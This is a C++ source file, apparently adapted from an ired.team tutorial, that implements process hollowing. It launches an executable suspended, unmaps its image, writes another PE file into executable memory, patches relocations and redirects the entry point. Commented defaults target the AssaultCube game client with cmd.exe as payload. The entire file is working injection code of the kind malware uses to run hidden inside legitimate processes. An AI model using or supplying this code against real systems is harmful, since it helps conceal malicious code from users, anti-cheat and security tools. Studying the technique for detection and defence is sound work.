//https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation
#include "process-hollow.h"

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int processHollow(const wchar_t* procName, const wchar_t* dllPath) {

	//procName = L"C:\\Program Files (x86)\\AssaultCube\\bin_win32\\ac_client.exe";
	//dllPath = L"C:\\Windows\\System32\\cmd.exe";

	LPSTARTUPINFO si = new STARTUPINFO();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLength = 0;


	if (CreateProcess(NULL, (LPWSTR)procName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi)) {
		HANDLE destProcess = pi->hProcess;

		//Get destination imageBase offset address from the PEB
		NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
		DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;

		//Get destination base address
		LPVOID destImageBase = 0;
		SIZE_T bytesRead = 0;
		ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);

		//Read the source file that should be executed inside hollowed process
		HANDLE sourceFile = CreateFile(dllPath, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
		DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
		LPDWORD fileBytesRead = 0;
		LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
		ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

		//Get source image size
		PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
		PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
		SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

		//Carve out destination Image
		NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandle(L"ntdll"), "NtUnmapViewOfSection"));
		myNtUnmapViewOfSection(destProcess, destImageBase);

		//allocate new memory in destination image for the source image
		LPVOID newDestImageBase = VirtualAllocEx(destProcess, NULL, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		destImageBase = newDestImageBase;

		//Get delta beetween sourceImageBaseAddress and destinationImageBaseAddress
		DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

		//Set sourceImageBase to destImageBase and copy source image headers to dest image headers
		sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
		WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

		//Get a pointer to the first source image section
		PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
		PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;

		// copy source image sections to destination
		for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
			PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
			PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
			WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
			sourceImageSection++;
		}

		//get the address of the relocation table
		IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		//patch the binary with relocations
		sourceImageSection = sourceImageSectionOld;
		for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
		{
			BYTE* relocSectionName = (BYTE*)".reloc";
			if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) {
				sourceImageSection++;
				continue;
			}

			DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
			DWORD relocationOffset = 0;

			while(relocationOffset < relocationTable.Size) {
				PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
				relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
				PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

				for (DWORD y = 0; y < relocationEntryCount; y++) {
					relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (relocationEntries[y].Type == 0) {
						continue;
					}

					DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
					DWORD patchedBuffer = 0;
					ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
					patchedBuffer += deltaImageBase;

					WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
					int a = GetLastError();
				}
			}
		}

		//Get context of the dest process thread
		LPCONTEXT context = new CONTEXT();
		context->ContextFlags = CONTEXT_INTEGER;
		GetThreadContext(pi->hThread, context);

		//update dest image entry point to new entry point of source image
		DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
		context->Eax = patchedEntryPoint;
		SetThreadContext(pi->hThread, context);
		ResumeThread(pi->hThread);

		return 0;
	}


}